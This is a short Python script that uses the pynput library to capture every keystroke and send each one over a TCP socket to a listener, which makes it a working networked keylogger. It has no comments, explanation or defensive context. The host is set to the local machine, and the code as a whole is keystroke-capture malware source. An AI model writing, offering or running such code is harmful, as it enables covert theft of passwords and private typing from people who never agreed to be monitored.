from pynput import keyboard
import socket
import select

IP = socket.gethostname()
PORT = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

def parse(txt):
    return str(txt).strip(r"'")

def onPress(key):
    if key:
        s.send(bytes(parse(key), "utf-8"))
    else:
         pass
with keyboard.Listener(on_press = onPress) as listener:
    listener.join()

s.close()
